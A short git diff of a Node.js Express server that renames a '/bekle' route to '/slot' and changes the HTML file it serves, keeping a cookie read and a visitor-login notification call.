@@ -64,13 +64,13 @@ app.get('/jojo', (req, res) => {
     });
   });
 
-  app.get('/bekle', (req, res) => {
+  app.get('/slot', (req, res) => {
     const submittedData = req.cookies.submittedData || 'No data submitted yet';
   
     notifyVisitorLogin()
     .then(() => {
       console.log('bekle sayfa');
-      res.sendFile(path.join(__dirname, 'public', 'bekle.html'));
+      res.sendFile(path.join(__dirname, 'public', 'slot.html'));
     })
     .catch((error) => {
       console.error('Error sending visitor login notification:', error);
